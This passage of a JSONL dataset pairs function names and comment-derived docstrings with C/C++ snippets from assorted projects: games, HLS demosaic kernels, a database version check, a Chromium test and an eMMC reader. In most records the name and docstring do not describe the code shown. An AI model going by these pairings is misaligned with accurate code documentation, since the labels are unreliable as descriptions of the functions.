belongs to old piece\\'s owner.\\n\\trequest_sound_effect(name, \"GROWTH\", \"GROWS\", false);\\n\\n\\t\/\/ See if piece dies after growing!\\n\\trnd = IRand(0, 99);\\n\\tif (rnd < board[x][y][PIECE].grow_die_chance) kill_piece(x, y, -1, false);\\n\\n\\twait_time(50);\\n}'}","id":1546}
{"content":"{'function_name': 'bonAppetit', 'docstring': '\/\/ Complete this function \\r', 'code': 'int main() {\\r\\n    int n;\\r\\n    int k;\\r\\n    cin >> n >> k;\\r\\n    vector<int> ar(n);\\r\\n    for(int ar_i = 0; ar_i < n; ar_i++){\\r\\n       cin >> ar[ar_i];\\r\\n    }\\r\\n    int b;\\r\\n    cin >> b;\\r\\n    \/\/int result = \\r\\n        bonAppetit(n, k, b, ar);\\r\\n    \/\/cout << result << endl;\\r\\n    return 0;\\r\\n}'}","id":1548}
{"content":"{'function_name': 'demosaic_bxb_rd3_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaic_bxb_rd4_select(demosaic_cache& demosaic, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_bxb_rd4 read pattern: { demosaic_bxb_update_0[d0, d1] -> demosaic[2 + 2d0, d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaic_bxb_update_0[d0, d1] -> [3 + d1, 3 + d0, 6] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { demosaic_update_0[d0, d1] -> [3 + d1, 2 + d0, 5] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ DD fold: {  }\\n  auto value_demosaic_demosaic_update_0_write0 = demosaic.demosaic_demosaic_update_0_write0_merged_banks_4.peek_0();\\n  return value_demosaic_demosaic_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1549}
{"content":"{'function_name': 'find_zero_crossing_on_face3', 'docstring': '\/\/auto ip = (pts[1] - pts[0]) * t + pts[0];', 'code': 'point<T, 2>\\nfind_zero_crossing_in_cell(const point<T,2>& p0, const point<T,2>& p1, const Function& level_set_function,\\n                   const T& threshold, const Mesh & msh, const typename Mesh::cell_type& cl)\\n{\\n    \/* !!! We assume that the level set function *has* a zero crossing\\n     * between p0 and p1 !!! *\/\\n    \\n    \/\/ I SHOULD CHECK THAT pm IS ALWAYS IN THE CELL ???????\\n    auto pa = p0;\\n    auto pb = p1;\\n    auto pm = (pa+pb)\/2.0;\\n    auto pm_prev = pm;\\n\\n    T x_diff_sq, y_diff_sq;\\n\\n    \/* A threshold of 1\/10000 the diameter of the element is considered\\n     * acceptable. Since with 24 iterations we reduce the error by 16384\\n     * and the worst case is that the two points are at the opposite sides\\n     * of the element, we put 30 as limit. *\/\\n    size_t max_iter = 50; \/\/ ERA 50, METTO 100\\n\\n    do {\\n        auto la = level_set_function(pa,msh,cl);\\n        auto lb = level_set_function(pb,msh,cl);\\n        auto lm = level_set_function(pm,msh,cl);\\n\\n        if ( (lb >= 0 && lm >= 0) || (lb < 0 && lm < 0) )\\n        {   \/* intersection is between pa and pm *\/\\n            pm_prev = pm;\\n            pb = pm;\\n            pm = (pa+pb)\/2.0;\\n        }\\n        else\\n        {   \/* intersection is between pm and pb *\/\\n            pm_prev = pm;\\n            pa = pm;\\n            pm = (pa+pb)\/2.0;\\n        }\\n\\n        x_diff_sq = (pm_prev.x() - pm.x()) * (pm_prev.x() - pm.x());\\n        y_diff_sq = (pm_prev.y() - pm.y()) * (pm_prev.y() - pm.y());\\n\\n    } while ( (sqrt(x_diff_sq + y_diff_sq) > threshold) && max_iter-- );\\n\\n    return pm;\\n\\n    \/* Affine zero crossing was like that: *\/\\n    \/\/auto t = l0\/(l0-l1);\\n    \/\/auto ip = (pts[1] - pts[0]) * t + pts[0];\\n}'}","id":1553}
{"content":"{'function_name': 'ErrDBGetDesiredVersion', 'docstring': '\/\/  Compute the desired DB version we want ...', 'code': 'ERR ErrDBICheckVersions(\\n    _In_    const INST* const               pinst,\\n    _In_z_  const WCHAR* const              wszDbFullName,\\n    _In_    const IFMP                      ifmp,\\n    _In_    const DBFILEHDR_FIX * const     pdbfilehdr,\\n    _In_    const DbVersion&                dbvDesired,\\n    _In_    const BOOL                      fAllowPersistedFormat,\\n    _Out_   BOOL * const                    pfDbNeedsUpdate = NULL )\\n{\\n    ERR     err     = JET_errSuccess;\\n\\n    DbVersion dbvEngineMax = PfmtversEngineMax()->dbv;\\n    \\n    \/\/  First check DB is not greater than the engine itself (this would be a version we can\\'t even hope to understand!).\\n\\n    if ( dbvEngineMax.ulDbMajorVersion < pdbfilehdr->le_ulVersion ||\\n        dbvEngineMax.ulDbMajorVersion == pdbfilehdr->le_ulVersion && dbvEngineMax.ulDbUpdateMajor < pdbfilehdr->le_ulDaeUpdateMajor )\\n        \/\/  Note: a too high le_ulDaeUpdateMinor is ok, as these are forward compatible changes.\\n    {\\n        WCHAR wszDatabaseVersion[50];\\n        WCHAR wszEngineVersion[50];\\n        const WCHAR * rgszT[3] = { wszDbFullName, wszDatabaseVersion, wszEngineVersion };\\n        \\n        OSStrCbFormatW( wszDatabaseVersion, _cbrg( wszDatabaseVersion ), L\"%d.%d.%d\", (ULONG)pdbfilehdr->le_ulVersion, (ULONG)pdbfilehdr->le_ulDaeUpdateMajor, (ULONG)pdbfilehdr->le_ulDaeUpdateMinor );\\n        OSStrCbFormatW( wszEngineVersion, _cbrg( wszEngineVersion ), L\"%d.%d.%d\", dbvEngineMax.ulDbMajorVersion, dbvEngineMax.ulDbUpdateMajor, dbvEngineMax.ulDbUpdateMinor );\\n        \\n        UtilReportEvent( eventError,\\n                GENERAL_CATEGORY,\\n                ATTACH_DATABASE_VERSION_TOO_HIGH_FOR_ENGINE_ID,\\n                _countof( rgszT ),\\n                rgszT,\\n                0,\\n                NULL,\\n                pinst );\\n\\n        Assert( FNegTest( fInvalidAPIUsage ) || FInEseutilPossibleUsageError() );\\n        Call( ErrERRCheck( JET_errInvalidDatabaseVersion ) );\\n    }\\n\\n    \/\/  Second check DB is not greater than the specified desired version (typically from the param).\\n\\n    if ( dbvDesired.ulDbMajorVersion < pdbfilehdr->le_ulVersion ||\\n        dbvDesired.ulDbMajorVersion == pdbfilehdr->le_ulVersion && dbvDesired.ulDbUpdateMajor < pdbfilehdr->le_ulDaeUpdateMajor )\\n    {\\n        WCHAR wszDatabaseVersion[50];\\n        WCHAR wszParamVersion[50];\\n        WCHAR wszParamEfv[cchFormatEfvSetting];\\n        const WCHAR * rgszT[5] = { wszDbFullName, wszDatabaseVersion, wszParamVersion, wszParamEfv, L\"\" \/* deprecated %8 *\/ };\\n        \\n        OSStrCbFormatW( wszDatabaseVersion, _cbrg( wszDatabaseVersion ), L\"%d.%d.%d\", (ULONG)pdbfilehdr->le_ulVersion, (ULONG)pdbfilehdr->le_ulDaeUpdateMajor, (ULONG)pdbfilehdr->le_ulDaeUpdateMinor );\\n        OSStrCbFormatW( wszParamVersion, _cbrg( wszParamVersion ), L\"%d.%d.%d\", dbvDesired.ulDbMajorVersion, dbvDesired.ulDbUpdateMajor, dbvDesired.ulDbUpdateMinor );\\n        FormatEfvSetting( (JET_ENGINEFORMATVERSION)UlParam( pinst, JET_paramEngineFormatVersion ), wszParamEfv, sizeof(wszParamEfv) );\\n        \/\/ deprecated: OSStrCbFormatW( wszAllowPersisted, _cbrg( wszAllowPersisted ), L\"%d\", fAllowPersistedFormat );\\n\\n        if ( fAllowPersistedFormat )\\n        {\\n#ifdef ENABLE_MICROSOFT_MANAGED_DATACENTER_LEVEL_OPTICS\\n            \/\/  Since the engine can understand this (got past first check AND the user \\n            \/\/  asked us to, we will let this through ...\\n\\n            UtilReportEvent( eventWarning,\\n                    GENERAL_CATEGORY,\\n                    ATTACH_DATABASE_VERSION_TOO_HIGH_FOR_PARAM_ID,\\n                    _countof( rgszT ),\\n                    rgszT,\\n                    0,\\n                    NULL,\\n                    pinst );\\n#endif\\n        }\\n        else\\n        {\\n            \/\/  User wants strict version compatibility, throw this one out.\\n\\n            UtilReportEvent( eventError,    \/\/ NOTE: Same event, but here it is an error, above it is a warning!\\n                    GENERAL_CATEGORY,\\n                    ATTACH_DATABASE_VERSION_TOO_HIGH_FOR_PARAM_ID,\\n                    _countof( rgszT ),\\n                    rgszT,\\n                    0,\\n                    NULL,\\n                    pinst );\\n            Assert( FNegTest( fInvalidAPIUsage ) || FInEseutilPossibleUsageError() );\\n            Call( ErrERRCheck( JET_errEngineFormatVersionSpecifiedTooLowForDatabaseVersion ) );\\n        }\\n    }\\n\\n    \/\/  Calculate if the le_efvMaxBinAttachDiagnostic needs updating ...\\n\\n    if ( pdbfilehdr->le_efvMaxBinAttachDiagnostic < JET_efvSetDbVersion &&\\n            \/\/  This is not a normal usage of ErrDBFormatFeatureEnabled_() as typically code\\n            \/\/  should be passing the current DB header format in as the 2nd arg.  Do not\\n            \/\/  copy this example. ;)  We can\\'t do that here b\/c this is _whether to actual\\n            \/\/  update the DB header iteself_, so the bootstrap has to check the desired \/ \\n            \/\/  param value instead.\\n            ErrDBFormatFeatureEnabled_( JET_efvSetDbVersion, dbvDesired ) >= JET_errSuccess )\\n    {\\n        if ( pfDbNeedsUpdate )\\n        {\\n            *pfDbNeedsUpdate = fTrue;\\n        }\\n    }\\n\\n    \/\/  Calculate if any of the main version numbers need updating ...\\n\\n    if ( CmpDbVer( pdbfilehdr->Dbv(), dbvDesired ) < 0 )\\n    {\\n        if ( pfDbNeedsUpdate )\\n        {\\n            *pfDbNeedsUpdate = fTrue;\\n        }\\n    }\\n\\nHandleError:\\n\\n    if ( err < JET_errSuccess )\\n    {\\n        OSTrace( JET_tracetagUpgrade, OSFormat( \"FAILED: ErrDBICheckVersions: %hs:%d\", PefLastThrow()->SzFile(), PefLastThrow()->UlLine() ) );\\n    }\\n\\n    return err;\\n}'}","id":1557}
{"content":"{'function_name': 'demosaic_bx_rd1_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<32> demosaic_bxb_demosaic_bx_update_0_read_bundle_read(demosaic_bxb_cache& demosaic_bxb, int d0, int d1) {\\n  \/\/ # of ports in bundle: 2\\n    \/\/ demosaic_bx_rd0\\n    \/\/ demosaic_bx_rd1\\n\\n\\thw_uint<32> result;\\n\\thw_uint<16> demosaic_bx_rd0_res = demosaic_bx_rd0_select(demosaic_bxb, d0, d1);\\n\\tset_at<0, 32>(result, demosaic_bx_rd0_res);\\n\\thw_uint<16> demosaic_bx_rd1_res = demosaic_bx_rd1_select(demosaic_bxb, d0, d1);\\n\\tset_at<16, 32>(result, demosaic_bx_rd1_res);\\n\\treturn result;\\n}'}","id":1564}
{"content":"{'function_name': 'condition_ast_from_capnp', 'docstring': '\/\/ properly.', 'code': \"Status reader_from_capnp(\\n    const capnp::QueryReader::Reader& reader_reader,\\n    Query* query,\\n    Reader* reader,\\n    ThreadPool* compute_tp) {\\n  auto array = query->array();\\n\\n  \/\/ Layout\\n  Layout layout = Layout::ROW_MAJOR;\\n  RETURN_NOT_OK(layout_enum(reader_reader.getLayout(), &layout));\\n\\n  \/\/ Subarray\\n  Subarray subarray(array, layout, query->stats(), dummy_logger, true);\\n  auto subarray_reader = reader_reader.getSubarray();\\n  RETURN_NOT_OK(subarray_from_capnp(subarray_reader, &subarray));\\n  RETURN_NOT_OK(query->set_subarray_unsafe(subarray));\\n\\n  \/\/ Read state\\n  if (reader_reader.hasReadState())\\n    RETURN_NOT_OK(read_state_from_capnp(\\n        array, reader_reader.getReadState(), query, reader, compute_tp));\\n\\n  \/\/ Query condition\\n  if (reader_reader.hasCondition()) {\\n    auto condition_reader = reader_reader.getCondition();\\n    QueryCondition condition;\\n    RETURN_NOT_OK(condition_from_capnp(condition_reader, &condition));\\n    RETURN_NOT_OK(query->set_condition(condition));\\n  }\\n\\n  \/\/ If cap'n proto object has stats set it on c++ object\\n  if (reader_reader.hasStats()) {\\n    stats::Stats* stats = reader->stats();\\n    \/\/ We should always have a stats here\\n    if (stats != nullptr) {\\n      RETURN_NOT_OK(stats_from_capnp(reader_reader.getStats(), stats));\\n    }\\n  }\\n\\n  return Status::Ok();\\n}\"}","id":1565}
{"content":"{'function_name': 'ForEachDownstreamEdge', 'docstring': '\/\/ Case 3.', 'code': 'void ForEachUpstreamEdge(const Node& node, Fn fn) {\\n  FX_CHECK(node.type() != Node::Type::kMeta);\\n\\n  \/\/ Three cases:\\n  \/\/\\n  \/\/ 1. node does not have a parent follow the direct edges.\\n  \/\/ 2. node is a child_source of a meta node: follow the direct edges.\\n  \/\/ 3. node is a child_dest of a meta node: follow implicit edges to the child_sources.\\n\\n  \/\/ Case 1 & 2.\\n  const auto* sources = &node.sources();\\n\\n  \/\/ Case 3.\\n  if (sources->empty()) {\\n    if (const auto& parent = node.parent(); parent) {\\n      const auto& child_dests = parent->child_dests();\\n      if (std::find_if(child_dests.begin(), child_dests.end(),\\n                       [&node](auto x) { return x.get() == &node; }) != child_dests.end()) {\\n        sources = &parent->child_sources();\\n      }\\n    }\\n  }\\n\\n  for (const auto& source : *sources) {\\n    fn(*source);\\n  }\\n}'}","id":1568}
{"content":"{'function_name': 'ball_in_obj', 'docstring': '\/* point-in-polygon algorithm found at:\\n\\t   http:\/\/www.ecse.rpi.edu\/Homepages\/wrf\/Research\/Short_Notes\/pnpoly.html\\n\\t*\/', 'code': 'float get_distance_sq_to_obj_edge(struct ball *ball, struct object *obj, int edge) {\\n\\tint edge2;\\n\\t\\n\\tedge2 = (edge+1) % obj->bbox->num_points;\\n\\t\\n\\t\/* return get_shortest_distance_sq(p0, p1, ball->x, ball->y, ball->z); *\/\\n\\treturn get_shortest_distance_sq_obj(\\n\\t\\tobj->bbox->x[edge], obj->bbox->y[edge], obj->bbox->z[edge],\\n\\t\\tobj->bbox->x[edge2], obj->bbox->y[edge2], obj->bbox->z[edge2],\\n\\t\\tball->x, ball_y(ball), ball->z\\n\\t\\t);\\n}'}","id":1573}
{"content":"{'function_name': 'solve_maze', 'docstring': '\/\/\\tmostrar(mat_mazebmp);\\r', 'code': 'int main(int argc, char *argv[])\\r\\n{\\r\\n\\t\/\/ redireccionar la entrada y salida\\r\\n\\t#ifndef ONLINE_JUDGE \\r\\n\\t\\tcin.rdbuf((new ifstream(\"input.txt\"))->rdbuf()); \\r\\n\\t\\tcout.rdbuf((new ofstream(\"output.txt\"))->rdbuf()); \\r\\n\\t#endif \\r\\n\\r\\n\\tvector<vector<char> > mat_maze;\\r\\n\\tint ancho, \\r\\n\\t\\tlargo, \\r\\n\\t\\tmaze = 0;\\r\\n\\tcin >> ancho >> largo;\\r\\n\\twhile (ancho && largo) {\\r\\n\\t\\tstring str_line;\\r\\n\\t\\tmaze++;\\r\\n\\t\\tmat_maze.resize(largo);\\r\\n\\t\\tfor (int i = 0; i < largo; i++) {\\r\\n\\t\\t\\tmat_maze[i].resize(ancho);\\r\\n\\t\\t\\tcin >> str_line;\\r\\n\\t\\t\\tfor (int j = 0; j < ancho; j++)\\r\\n\\t\\t\\t\\tmat_maze[i][j] = str_line[j];\\r\\n\\t\\t}\\t\\t\\r\\n\\t\\tpair<int, int> sol;\\r\\n\\t\\tsol = solve_maze(mat_maze);\\r\\n\\t\\t\/\/ mostrar salida\\r\\n\\t\\tcout << \"Maze #\" << maze << \":\" << endl;\\r\\n\\t\\tif (!sol.first)\\r\\n\\t\\t\\tcout << \"There are no cycles.\" << endl << endl;\\r\\n\\t\\telse\\r\\n\\t\\t\\tcout << sol.first << \" Cycles; the longest has length \" << sol.second << \".\" << endl << endl;\\r\\n\\t\\t\\t\\r\\n\\t\\tcin >> ancho >> largo;\\r\\n\\t}\\r\\n\\r\\n\\treturn 0;\\r\\n}'}","id":1574}
{"content":"{'function_name': 'ahci_ctlr_setup', 'docstring': '\/* Enable AHCI interrupts *\/', 'code': 'int ahci_ctlr_reset(device_t dev) {\\n  \/\/ \\tstruct ahci_controller *ctlr = reinterpret_cast<struct ahci_controller\\n  \/\/ *>(device_get_softc(dev)); \\tint timeout;\\n\\n  \/\/ \\t\/* Enable AHCI mode *\/\\n  \/\/ \\tATA_OUTL(ctlr->r_mem, AHCI_GHC, AHCI_GHC_AE);\\n  \/\/ \\t\/* Reset AHCI controller *\/\\n  \/\/ \\tATA_OUTL(ctlr->r_mem, AHCI_GHC, AHCI_GHC_AE|AHCI_GHC_HR);\\n  \/\/ \\tfor (timeout = 1000; timeout > 0; timeout--) {\\n  \/\/ \\t\\tDELAY(1000);\\n  \/\/ \\t\\tif ((ATA_INL(ctlr->r_mem, AHCI_GHC) & AHCI_GHC_HR) == 0)\\n  \/\/ \\t\\t\\tbreak;\\n  \/\/ \\t}\\n  \/\/ \\tif (timeout == 0) {\\n  \/\/ \\t\\tdevice_printf(dev, \"AHCI controller reset failure\\\\n\");\\n  \/\/ \\t\\treturn (ENXIO);\\n  \/\/ \\t}\\n  \/\/ \\t\/* Reenable AHCI mode *\/\\n  \/\/ \\tATA_OUTL(ctlr->r_mem, AHCI_GHC, AHCI_GHC_AE);\\n\\n  \/\/ \\tif (ctlr->quirks & AHCI_Q_RESTORE_CAP) {\\n  \/\/ \\t\\t\/*\\n  \/\/ \\t\\t * Restore capability field.\\n  \/\/ \\t\\t * This is write to a read-only register to restore its state.\\n  \/\/ \\t\\t * On fully standard-compliant hardware this is not needed and\\n  \/\/ \\t\\t * this operation shall not take place. See ahci_pci.c for\\n  \/\/ \\t\\t * platforms using this quirk.\\n  \/\/ \\t\\t *\/\\n  \/\/ \\t\\tATA_OUTL(ctlr->r_mem, AHCI_CAP, ctlr->caps);\\n  \/\/ \\t}\\n\\n  return (0);\\n}'}","id":1580}
{"content":"{'function_name': 'global_update', 'docstring': '\/\/ std::cout<<\"numero nodi \"<<nodes_position.size()<<std::endl;', 'code': 'std::vector<size_t> boundary_nodes_function( size_t Nx , size_t Ny )\\n{\\n    \/\/ IT WORKS ONLY FOR Q1!!!\\n    std::vector<size_t> bdry_nodes ;\\n    for (size_t j = 1 ; j<=Ny ; j++) {\\n        bdry_nodes.push_back( j*(Nx+1) -1 ) ;\\n        bdry_nodes.push_back( j*(Nx+1) ) ;\\n    }\\n    for( size_t j = 1 ; j< Nx ; j++){\\n        bdry_nodes.push_back( j ) ;\\n        bdry_nodes.push_back( Ny*(Nx+1)+j ) ;\\n    }\\n    bdry_nodes.push_back( 0 ) ;\\n    bdry_nodes.push_back( (Ny+1)*(Nx+1)-1 ) ;\\n    std::sort(bdry_nodes.begin(), bdry_nodes.end() );\\n    \\n    return bdry_nodes;\\n}'}","id":1585}
{"content":"{'function_name': 'GetColor', 'docstring': '\/\/ color components differ.', 'code': \"static nsresult\\nGetColorIndex(nsPresContext* aPresContext, const nsMediaFeature*,\\n              nsCSSValue& aResult)\\n{\\n    \/\/ We should return zero if the device does not use a color lookup\\n    \/\/ table.  Stuart says that our handling of displays with 8-bit\\n    \/\/ color is bad enough that we never change the lookup table to\\n    \/\/ match what we're trying to display, so perhaps we should always\\n    \/\/ return zero.  Given that there isn't any better information\\n    \/\/ exposed, we don't have much other choice.\\n    aResult.SetIntValue(0, eCSSUnit_Integer);\\n    return NS_OK;\\n}\"}","id":1594}
{"content":"{'function_name': 'calculate_blocking_hybrid_diff', 'docstring': '\/\/ Get the direct blocking', 'code': 'double calculate_blocking_hybrid_direct_init(unsigned int index, const std::vector<Task> &task_vector, \\n\\t\\t\\t\\t\\t\\t\\t\\t const std::vector<double> &resp_time_rd,\\t\\t\\n\\t\\t\\t\\t\\t\\t\\t\\t const std::vector<double> &resp_time_jd,\\n\\t\\t\\t\\t\\t\\t\\t\\t const std::vector<std::vector<double>> &req_blocking)\\n{\\n\\tdouble blocking = 0;\\n\\tdouble alpha, beta, delta;\\n\\tunsigned int num_gpu_segments_blk = task_vector[index].getNumGPUSegments(); \/\/ num gpu requests of blocked task\\n\\tunsigned int num_gpu_segments;\\n\\n\\tif (num_gpu_segments_blk == 0)\\n\\t\\treturn blocking;\\n\\n\\t\/\/ Calculate the direct blocking due to all hp requests\\n\\tfor (unsigned int i = 0; i < index; i++)\\n\\t{\\n\\t\\tnum_gpu_segments = task_vector[i].getNumGPUSegments();\\n\\t\\tif (task_vector[i].getTotalGe() != 0)\\n\\t\\t{\\n\\t\\t\\t\/\/ Compute alpha as per the job-driven approach\\n\\t\\t\\talpha = ceil((resp_time_jd[index] + resp_time_jd[i] - ((task_vector[i].getC()+task_vector[i].getTotalGm())))\/task_vector[i].getT());\\n\\t\\t\\t\/\/ Compute beta (sum) as per the request-driven approach\\n\\t\\t\\tbeta = 0;\\n\\t\\t\\tfor (unsigned int req_index = 0; req_index < num_gpu_segments_blk; req_index++)\\n\\t\\t\\t{\\n\\t\\t\\t\\tif (task_vector[index].getGe(req_index) != 0)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tbeta = beta + ceil((req_blocking[index][req_index] + resp_time_rd[i] - ((task_vector[i].getC()+task_vector[i].getTotalGm())))\/task_vector[i].getT());\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\n\\t\\t\\t\/\/ Set the value of delta\\n\\t\\t\\tif (beta < alpha)\\n\\t\\t\\t\\tdelta = beta;\\n\\t\\t\\telse\\n\\t\\t\\t\\tdelta = alpha;\\n\\n\\t\\t\\t\/\/ Compute the direct blocking due to high-prio task requests\\n\\t\\t\\tfor (unsigned int req_index = 0; req_index < num_gpu_segments; req_index++)\\n\\t\\t\\t{\\n\\t\\t\\t\\tif (task_vector[i].getGe(req_index) != 0)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tblocking = blocking + delta*(task_vector[i].getH(req_index));\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\treturn blocking;\\n}'}","id":1595}
{"content":"{'function_name': 'stop_dtrace', 'docstring': '\/\/ do nothing', 'code': 'T_sp varArgsList(int n_args, ...) {\\n  DEPRECATED();\\n  va_list ap;\\n  va_start(ap, n_args);\\n  Cons_O::CdrType_sp first = _Nil<Cons_O::CdrType_O>();\\n  Cons_O::CdrType_sp *curP = &first; \/\/ gctools::StackRootedPointerToSmartPtr<Cons_O::CdrType_O> cur(&first);\\n  for (int i = 1; i <= n_args; ++i) {\\n    T_sp obj = *(va_arg(ap, const T_sp *));\\n    Cons_sp one = Cons_O::create(obj,_Nil<T_O>());\\n    *curP = one;          \/\/ cur.setPointee(one); \/\/ *cur = one;\\n    curP = one->cdrPtr(); \/\/ cur.setPointer(one->cdrPtr()); \/\/ cur = one->cdrPtr();\\n  }\\n  va_end(ap);\\n  return first;\\n}'}","id":1600}
{"content":"{'function_name': 'geoLeerParametrosDeControlDeArchivoDeTexto', 'docstring': '\/\/Cerrando archivo', 'code': 'void readRGBImageFromBMPFile(char *filename)\\n{\\n    FILE *fd;\\n    int width, height;\\n    int i, j;\\n    int n;\\n\\n    fd = fopen(filename, \"rb\");\\n    if (fd == NULL)\\n    {\\n        printf(\"Error: fopen failed\\\\n\");\\n        return;\\n    }\\n\\n    unsigned char header[54];\\n\\n    \/\/ Read header\\n    n=fread(header, sizeof(unsigned char), 54, fd);\\n    if (n==0) {printf(\"No se pudieron leer datos\\\\n\"); exit(0);}\\n\\n    \/\/ Capture dimensions\\n    width = *(int*)&header[18];\\n    height = *(int*)&header[22];\\n\\n    int padding = 0;\\n\\n    \/\/ Calculate padding\\n    while ((width * 3 + padding) % 4 != 0)\\n    {\\n        padding++;\\n    }\\n\\n    \/\/ Compute new width, which includes padding\\n    int widthnew = width * 3 + padding;\\n\\n    \/\/ Allocate temporary memory to read widthnew size of data\\n    unsigned char* data = (unsigned char *)malloc(widthnew * sizeof (unsigned int));\\n\\n    \/\/ Read row by row of data and remove padded data.\\n    for (i = 0; i<height; i++)\\n    {\\n        \/\/ Read widthnew length of data\\n        n=fread(data, sizeof(unsigned char), widthnew, fd);\\n        if (n==0) {printf(\"No se pudieron leer datos\\\\n\"); exit(0);}\\n\\n        \/\/ Retain width length of data, and swizzle RB component.\\n        \/\/ BMP stores in BGR format, my usecase needs RGB format\\n        for (j = 0; j < width * 3; j += 3)\\n        {\\n            int index = (i * width * 3) + (j);\\n            pInputImage->prgb[index + 0] = data[j + 2];\\n            pInputImage->prgb[index + 1] = data[j + 1];\\n            pInputImage->prgb[index + 2] = data[j + 0];\\n        }\\n    }\\n\\n    free(data);\\n    fclose(fd);\\n}'}","id":1604}
{"content":"{'function_name': 'RobotArm', 'docstring': '\/\/ Go to pose \"stby_pick\"    ', 'code': 'int main(int argc, char** argv)\\n{\\n  \/\/ Create an controller instance\\n  ros::init(argc, argv, \"ur5_control\");\\n  RobotArm arm;\\n  ros::spin();\\n  return 0;\\n}'}","id":1605}
{"content":"{'function_name': 'numBitsSet2', 'docstring': '\/\/An int32 should by 4 bytes.', 'code': 'int main()\\n{\\n\\t\/\/Count the number of bits set to 1 for an integer.\\n\\tclock_t startOne = clock();\\n\\tprintf(\"%d\\\\n\", numBitsSet1(5));\\n\\tclock_t endOne = clock();\\n\\t\\n\\tclock_t startTwo = clock();\\n\\tprintf(\"%d\\\\n\", numBitsSet2(5));\\n\\tclock_t endTwo = clock();\\n\\t\\n\\tprintf(\"First function took %f seconds\\\\n\", double(endOne - startOne) \/ CLOCKS_PER_SEC);\\n\\tprintf(\"Second function took %f seconds\\\\n\", double(endTwo - startTwo) \/ CLOCKS_PER_SEC);\\n\\t\\n\\treturn 0;\\n}'}","id":1615}
{"content":"{'function_name': 'TEST_F', 'docstring': \"\/\/ we should see the histograms' false buckets populated.\", 'code': 'LoadTimingInfo RunURLRequestInterceptorLoadTimingTest(\\n    const LoadTimingInfo& job_load_timing,\\n    const URLRequestContext& context,\\n    URLRequestInterceptorWithLoadTimingInfo* interceptor) {\\n  interceptor->set_main_request_load_timing_info(job_load_timing);\\n  TestDelegate d;\\n  std::unique_ptr<URLRequest> req(\\n      context.CreateRequest(GURL(\"http:\/\/test_intercept\/foo\"), DEFAULT_PRIORITY,\\n                            &d, TRAFFIC_ANNOTATION_FOR_TESTS));\\n  req->Start();\\n  d.RunUntilComplete();\\n\\n  LoadTimingInfo resulting_load_timing;\\n  req->GetLoadTimingInfo(&resulting_load_timing);\\n\\n  \/\/ None of these should be modified by the URLRequest.\\n  EXPECT_EQ(job_load_timing.socket_reused, resulting_load_timing.socket_reused);\\n  EXPECT_EQ(job_load_timing.socket_log_id, resulting_load_timing.socket_log_id);\\n  EXPECT_EQ(job_load_timing.send_start, resulting_load_timing.send_start);\\n  EXPECT_EQ(job_load_timing.send_end, resulting_load_timing.send_end);\\n  EXPECT_EQ(job_load_timing.receive_headers_start,\\n            resulting_load_timing.receive_headers_start);\\n  EXPECT_EQ(job_load_timing.receive_headers_end,\\n            resulting_load_timing.receive_headers_end);\\n  EXPECT_EQ(job_load_timing.push_start, resulting_load_timing.push_start);\\n  EXPECT_EQ(job_load_timing.push_end, resulting_load_timing.push_end);\\n\\n  return resulting_load_timing;\\n}'}","id":1616}
{"content":"{'function_name': 'xor_update', 'docstring': '\/* update IFWI xor *\/', 'code': 'static int readbyte_umip_emmc(uint32_t addr_offset)\\n{\\n\\tint boot_fd = 0;\\n\\tchar *ptr;\\n\\tint value = 0;\\n\\n\\tif (force_rw(\"\/sys\/block\/mmcblk0boot0\/force_ro\")) {\\n\\t\\tfprintf(stderr, \"read_umip_emmc: unable to force_ro\\\\n\");\\n\\t\\tgoto err_boot1;\\n\\t}\\n\\tboot_fd = open(\"\/dev\/block\/mmcblk0boot0\", O_RDWR);\\n\\tif (boot_fd < 0) {\\n\\t\\tfprintf(stderr, \"read_umip_emmc: failed to open \/dev\/block\/mmcblk0boot0\\\\n\");\\n\\t\\tgoto err_boot1;\\n\\t}\\n\\n\\tptr = (char *)mmap(NULL, BOOT_UMIP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, boot_fd, 0);\\n\\tif (ptr == MAP_FAILED) {\\n\\t\\tfprintf(stderr, \"read_umip_emmc: mmap failed on boot0 with error : %s\\\\n\", strerror(errno));\\n\\t\\tgoto err_boot1;\\n\\t}\\n\\n\\t\/* Read the data *\/\\n\\tif (addr_offset < BOOT_UMIP_SIZE)\\n\\t\\tvalue = (int)*(ptr + addr_offset);\\n\\telse {\\n\\t\\tfprintf(stderr, \"read_umip_emmc: read failed\\\\n\");\\n\\t\\tgoto err_boot2;\\n\\t}\\n\\n\\tmunmap(ptr, BOOT_UMIP_SIZE);\\n\\tclose(boot_fd);\\n\\n\\treturn value;\\n\\nerr_boot2:\\n\\tmunmap(ptr, BOOT_UMIP_SIZE);\\n\\nerr_boot1:\\n\\tclose(boot_fd);\\n\\treturn -1;\\n}'}","id":1620}
